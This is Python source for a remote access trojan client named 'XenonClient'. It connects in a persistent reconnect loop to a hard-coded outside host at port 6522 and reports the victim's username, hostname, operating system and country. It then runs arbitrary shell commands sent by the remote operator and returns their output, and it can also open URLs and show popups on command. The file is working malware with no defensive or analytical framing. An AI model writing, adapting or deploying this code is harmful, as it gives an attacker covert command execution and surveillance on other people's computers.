import socket
import subprocess
import json
import time
import tkinter as tk
from tkinter import messagebox
import webbrowser
import winsound
import platform
import getpass
import urllib.request

class XenonClient:
    def __init__(self, ip, port):
        self.ip = ip; self.port = port

    def get_recon(self):
        data = {"id": f"{getpass.getuser()}@{platform.node()}", "os": f"{platform.system()} {platform.release()}", "country": "??"}
        try:
            with urllib.request.urlopen("http://ip-api.com/json/", timeout=3) as r:
                data["country"] = json.loads(r.read().decode()).get("countryCode", "??")
        except: pass
        return data

    def run(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.ip, self.port))
                self.sock.send(json.dumps(self.get_recon()).encode("utf-8"))
                
                while True:
                    data = self.sock.recv(16384).decode("utf-8")
                    if not data: break
                    
                    if data.startswith("msg|"):
                        m = data.split("|")[1]
                        threading.Thread(target=self.popup, args=(m,)).start()
                    elif data.startswith("open_url|"):
                        webbrowser.open(data.split("|")[1])
                    elif data == "beep":
                        winsound.Beep(1000, 500)
                    elif data.startswith("shell|"):
                        cmd = data.split("|")[1]
                        out = subprocess.getoutput(cmd)
                        self.sock.send(out.encode("utf-8") if out else b"Done.")
            except: time.sleep(5)
            finally: self.sock.close()

    def popup(self, msg):
        r = tk.Tk(); r.withdraw(); r.attributes("-topmost", True)
        messagebox.showinfo("Xenon System", msg); r.destroy()

if __name__ == "__main__":
    import threading
    XenonClient("uwtd3ffva.localto.net", 6522).run()
